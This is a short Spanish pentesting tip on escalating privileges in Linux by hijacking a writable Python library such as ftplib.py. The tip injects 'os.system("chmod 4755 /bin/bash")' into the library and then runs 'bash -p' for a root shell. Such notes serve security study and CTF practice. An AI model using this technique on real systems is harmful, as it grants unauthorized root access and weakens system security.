Si nos encontramos un binario de python, que se ejecuta a cada rato, o que tenemos permisos para ejecutarlo pero no para editarlo, no está todo perdido. En ocasiones, algun usuario puede pertenecer a algún grupo que tenga permisos de edición sobre las librerías de python.

Ejemplo de librería: **/usr/lib/python2.7/ftplib.py**

Si la podemos editar, en alguna parte de su código podemos añadir:
```bash
import os
os.system("chmod 4755 /bin/bash")
```

Luego basta con un simple:
```bash
bash -p
```